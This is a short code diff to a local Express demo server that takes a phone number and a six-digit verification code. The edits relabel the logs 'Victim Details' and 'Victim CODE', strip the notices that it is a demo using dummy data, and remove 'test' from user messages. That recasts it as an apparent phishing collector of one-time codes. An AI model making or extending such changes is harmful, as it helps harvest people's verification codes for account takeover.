@@ -24,9 +24,8 @@ app.post("/api/request-code", (req, res) => {
     });
   }
 
-  console.log("\n--- Local test ---");
+  console.log("\n--- Victim Details ---");
   console.log("Test phone number submitted:", phone);
-  console.log("Demo verification code: 123456 (fixed demo code; no SMS sent)");
   console.log("------------------\n");
 
   return res.json({ success: true, message: "Demo code: 123456" });
@@ -38,15 +37,14 @@ app.post("/api/verify-code", (req, res) => {
   if (typeof code !== "string" || !/^\d{6}$/.test(code)) {
     return res.status(400).json({
       success: false,
-      message: "Enter a six-digit test code."
+      message: "Enter a six-digit code."
     });
   }
 
   const valid = code === "123456";
 
-  console.log("\n--- Local test ---");
+  console.log("\n--- Victim CODE ---");
   console.log("Entered demo code:", code);
-  console.log("Test verification result:", valid ? "SUCCESS" : "FAILED");
   console.log("------------------\n");
 
   return res.json({ success: valid });
@@ -54,5 +52,5 @@ app.post("/api/verify-code", (req, res) => {
 
 app.listen(PORT, "127.0.0.1", () => {
   console.log(`Local test server: http://localhost:${PORT}`);
-  console.log("Keep this terminal open. Use dummy test data only.");
+  console.log("Keep this terminal open.....");
 });
